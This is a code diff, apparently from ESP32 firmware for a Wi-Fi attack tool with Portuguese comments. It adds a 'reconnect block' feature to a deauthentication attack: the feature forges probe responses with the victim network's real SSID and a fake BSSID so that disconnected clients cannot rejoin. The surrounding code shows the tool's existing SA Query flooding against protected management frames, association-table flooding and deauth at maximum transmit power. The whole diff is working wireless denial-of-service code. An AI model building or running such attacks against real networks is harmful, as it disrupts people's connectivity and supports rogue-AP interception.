@@ -16,9 +16,11 @@ public:
     uint8_t  intensity     = 1;  // 0=suave, 1=normal, 2=agressivo
 
     // Modos especiais
-    bool pmfBypass    = false; // SA Query flood para APs com 802.11w
-    bool assocFlood   = false; // Inunda tabela de associação do AP
-    bool nullFrames   = true;  // Envia null-function com PM=1 (power-save trick)
+    bool pmfBypass       = false; // SA Query flood para APs com 802.11w
+    bool assocFlood      = false; // Inunda tabela de associação do AP
+    bool nullFrames      = true;  // Envia null-function com PM=1 (power-save trick)
+    bool reconnectBlock  = false; // Probe Response flood falso — impede cliente de reconectar
+    char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock)
 
     uint8_t targetAP[6]     = {0};
     uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -38,7 +40,7 @@ public:
     LockChannelFn fnLockChannel = nullptr;
     ResumeHopFn   fnResumeHop   = nullptr;
 
-    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false) {
+    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false, const char* ssid = nullptr) {
         memcpy(targetAP, ap, 6);
         if (client) memcpy(targetClient, client, 6);
         else        memset(targetClient, 0xFF, 6);
@@ -49,14 +51,17 @@ public:
         _seq          = 0;
         multiMode     = false;
         running       = true;
+        if (ssid) { strncpy(targetSSID, ssid, 32); targetSSID[32] = 0; }
+        else       targetSSID[0] = 0;
         if (fnLockChannel) fnLockChannel(ch);
         esp_wifi_set_max_tx_power(84); // ~20 dBm
         String mode = broadcastMode ? "BROADCAST" : bssidStr(client);
         LOG.warn("[DEAUTH] " + bssidStr(ap) + " -> " + mode +
                  " ch" + String(ch) +
-                 (nullFrames  ? " +NULL"  : "") +
-                 (pmfBypass   ? " +PMF"   : "") +
-                 (assocFlood  ? " +ASSOC" : "") +
+                 (nullFrames      ? " +NULL"    : "") +
+                 (pmfBypass       ? " +PMF"     : "") +
+                 (assocFlood      ? " +ASSOC"   : "") +
+                 (reconnectBlock  ? " +REBLOCK" : "") +
                  (autoC ? " [AUTO-CAPTURE]" : ""));
     }
 
@@ -156,6 +161,13 @@ private:
                 framesSent++;
             }
         }
+
+        // Reconnect Block: envia probe responses com o SSID real mas BSSID falso
+        // Cliente pós-deauth fica tentando se associar ao AP falso em vez do real
+        if (reconnectBlock && targetSSID[0] != 0 && !broadcastMode) {
+            _sendReconnectBlock(targetClient, targetSSID, channel);
+            framesSent++;
+        }
     }
 
     void _tickMulti() {
@@ -246,6 +258,39 @@ private:
         f[25] = 0x00; // Request
         f[26] = txid & 0xFF; f[27] = (txid >> 8) & 0xFF;
         esp_wifi_80211_tx(WIFI_IF_AP, f, 28, true);
+    }
+
+    // Probe Response falsa com SSID real mas BSSID aleatório
+    // Enviada diretamente ao cliente (unicast) após deauth
+    // Efeito: cliente fica "preso" tentando associar ao AP fantasma
+    void _sendReconnectBlock(const uint8_t* cli, const char* ssid, uint8_t ch) {
+        uint8_t ssidLen = strlen(ssid);
+        if (ssidLen > 32) ssidLen = 32;
+        // BSSID falso: mesmo FNV-1a do Karma, XOR com seq para variar a cada envio
+        uint32_t h = 2166136261u;
+        for (int i = 0; i < ssidLen; i++) h = (h ^ (uint8_t)ssid[i]) * 16777619u;
+        h ^= (uint32_t)_seq;
+        uint8_t fakeBSSID[6] = {0x02, (uint8_t)(h>>24), (uint8_t)(h>>16), (uint8_t)(h>>8), (uint8_t)h, ch};
+
+        uint8_t f[128] = {};
+        uint8_t off = 0;
+        f[off++] = 0x50; f[off++] = 0x00; // Probe Response
+        f[off++] = 0x00; f[off++] = 0x00;
+        memcpy(f + off, cli, 6);       off += 6; // DA = cliente
+        memcpy(f + off, fakeBSSID, 6); off += 6; // SA = AP falso
+        memcpy(f + off, fakeBSSID, 6); off += 6; // BSSID = AP falso
+        f[off++] = 0x00; f[off++] = 0x00;
+        uint64_t ts = esp_timer_get_time();
+        memcpy(f + off, &ts, 8); off += 8;
+        f[off++] = 0x64; f[off++] = 0x00; // beacon interval
+        f[off++] = 0x31; f[off++] = 0x04; // capabilities
+        f[off++] = 0x00; f[off++] = ssidLen;
+        memcpy(f + off, ssid, ssidLen); off += ssidLen;
+        f[off++] = 0x01; f[off++] = 0x08;
+        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
+        memcpy(f + off, rates, 8); off += 8;
+        f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
+        esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
     }
 
     // Auth Request de MAC aleatório → enche tabela de autenticação do AP
